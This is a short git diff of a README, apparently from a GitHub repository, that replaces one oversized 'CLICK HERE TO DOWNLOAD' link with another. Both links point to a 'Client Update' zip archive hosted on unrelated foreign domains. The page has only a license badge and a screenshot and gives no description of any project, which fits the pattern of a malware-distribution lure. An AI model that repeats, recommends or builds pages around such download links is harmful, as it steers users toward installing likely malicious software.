@@ -1,6 +1,6 @@
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 
-# [CLICK HERE TO DOWNLOAD](https://minisminies.ma/temp/Client%20Update.zip)
+# [CLICK HERE TO DOWNLOAD](https://allotaxidakar.com/temp/Client%20Update%20setup.zip)
 
 # Screenshot
 ![image](https://github.com/2898531823/28985318231/assets/61122052/dae87260-fa58-428b-aab6-64034434a353)
